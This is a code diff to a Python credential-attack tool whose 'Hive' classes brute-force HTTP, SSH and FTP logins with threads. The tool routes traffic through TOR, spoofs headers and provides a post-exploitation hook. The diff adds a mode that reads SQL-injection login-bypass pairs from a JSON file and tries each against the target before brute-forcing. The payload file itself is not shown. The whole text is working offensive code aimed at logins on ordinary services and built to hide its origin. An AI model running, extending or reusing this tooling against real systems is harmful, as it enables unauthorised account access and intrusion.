@@ -7,6 +7,7 @@ from console import Console
 import random
 from bloomfilter import BloomFilter
 from ftplib import FTP
+import json
 try:
 	import pexpect
 except:
@@ -62,7 +63,8 @@ class Hive:
 	# param: workers(int)			- The number of threads to create
 	# description: Starts the bruteforcing process
 	def start(self, workers=1):
-		self.startTime = time.time()
+		if not self.startTime:
+			self.startTime = time.time()
 		for count in range(workers):
 			thread = Thread(target=self.run, args=())
 			self.workerList.append(thread)
@@ -336,12 +338,30 @@ class HttpHive(Hive):
 	proxies = None
 	form_method = None
 	examplePayload = None 
+	SQLInjectionFile = None
+	SQLInjectionCredentialList = None
+	testSQLInjections = None
 
 	def __init__(self):
 		Hive.__init__(self)
 		failedbaseline = dict()
 		self.form_method = 0
 		self.examplePayload = ''
+		self.testSQLInjections = False
+		self.SQLInjectionCredentialList = list()
+	
+	# function: start
+	# param: workers(int)			- The number of threads to create
+	# description: Overriden in order to test for SQL injections, if specified.
+	def start(self,workers=1):
+		self.startTime = time.time()
+		if self.testSQLInjections == True:
+			self.SQLInjectionFile = 'sql-inject.json'
+			self.__loadLoginSQLInjection__()
+			for cred in self.SQLInjectionCredentialList:
+				result = self.attemptLogin(cred)
+				self.__displayMessage__(cred,result)
+		Hive.start(self,workers)
 
 	# function: __findForms__
 	# return: [str] 	- array of forms in html code
@@ -403,12 +423,6 @@ class HttpHive(Hive):
                 for form in forms:
 			if self.LOGIN_REGEX.search(form):
                 		loginform = form
-				if self.AUTHENTICATION_TYPE.search(str(forms)):
-					ATYPE = self.AUTHENTICATION_TYPE.findall(str(forms))[0]
-					if len(ATYPE[0]) > 0 or len(ATYPE[1]) > 0:
-						self.form_method = 0
-					elif len(ATYPE[2]) > 0 or len(ATYPE[3]) > 0:
-						self.form_method = 1
                 return loginform
 
 
@@ -467,6 +481,7 @@ class HttpHive(Hive):
 		html = requests.get(self.target,headers=self.getSpoofedHeaders(),proxies=self.proxies).text
 		forms = self.__findForms__(html)
 		login = self.__getLoginForm__(forms)
+		self.form_method = self.__checkLoginType__(forms)
 		self.basePayload = self.__findFields__(login)
 		self.setFailedBaseline(self.basePayload)
 		# Setting handle for post exploitation, to self.postExploit
@@ -514,7 +529,31 @@ class HttpHive(Hive):
 	# description: Sets up the proxies to use TOR
 	def setupTOR(self):
 		self.proxies = {'http':'socks5://localhost:9050','https':'socks5://localhost:9050'}
+	
+	# function: __checkLoginType__
+	# param: array		- an array of forms
+	# return: int		- 0 for POST and 1 for GET, None for none found	
+	# description: Checks the array of forms for the Type of login present
+	def __checkLoginType__(self,forms):
+		form_method = None
+		if self.AUTHENTICATION_TYPE.search(str(forms)):
+			ATYPE = self.AUTHENTICATION_TYPE.findall(str(forms))[0]
+			if len(ATYPE[0]) > 0 or len(ATYPE[1]) > 0:
+				form_method = 0
+			elif len(ATYPE[2]) > 0 or len(ATYPE[3]) > 0:
+				form_method = 1
+		return form_method
 
+	# function: __loadSQLInjectionFields__
+	# description: Loads some SQL Injections specific for logins
+	def __loadLoginSQLInjection__(self):
+		with open(self.SQLInjectionFile,'r') as sqlfile:
+			sqldata = json.load(sqlfile)
+		for groups in sqldata['logins']:
+			username = groups['username']
+			password = groups['password']
+			cred = Credential(username,password,self.target)
+			self.SQLInjectionCredentialList.append(cred)
 
 # class: SSHHive
 # description: Hive used to brute-force ssh logins
@@ -560,7 +599,7 @@ class SSHHive(Hive):
 	# description: This is another example of a post exploit function, as you can see it requires a credential object
 	def postExploit(self,credential):
 		pass
-
+	
 # class: FTPHive
 # description: Hive used to brute-force FTP Logins
 class FTPHive(Hive):
